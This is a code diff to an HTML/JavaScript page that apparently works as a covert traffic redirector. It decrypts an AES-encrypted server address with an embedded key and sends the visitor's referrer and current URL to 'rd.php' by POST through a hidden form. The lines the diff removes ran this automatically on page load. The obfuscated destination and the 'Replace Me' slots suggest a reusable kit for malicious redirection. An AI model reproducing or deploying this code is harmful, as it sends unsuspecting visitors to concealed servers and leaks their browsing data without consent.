@@ -1,9 +1,13 @@
-<!DOCTYPE html>
-<script cript type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
 <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
 <script type="text/javascript">
 function exec()
-{var config = { serverList: ['U2FsdGVkX1+R6c63BagEKOVCDgDFOCS2YoXiDGiwP+zWz4deBG2KtRVNFC0I3D/N'], redirectPage: 'rd.php', redirectMethod: 'POST', redirectFormMessage: 'blog', encKey: '3625'}  var redirectServer = getServer();
+{
+  // Replace Me
+  var config = { serverList: ['U2FsdGVkX19Wdo8Pp7TTU2j9hXuTvz1xzydKGVit+v45kgCmq9esfALLiG1fZ1fv'], redirectPage: 'rd.php', redirectMethod: 'POST', redirectFormMessage: 'blog', encKey: '12313'};
+  // Replace Me
+
+  var redirectServer = getServer();
   var redirectMethod = config.redirectMethod;
   var redirectServerUrl = redirectServer + '/' + config.redirectPage + '?from=' + document['referrer'] + '&amp;self=' + window['location']['href'];
 
@@ -81,10 +85,3 @@ function exec()
   }
 }
 </script>
-<body onload="exec()">
-<form style="display: hidden" action="" method="POST" id="form">
-    <input type="hidden" id="f" name="f" value=""/>
-    </form>
-</body>
-
-</html>
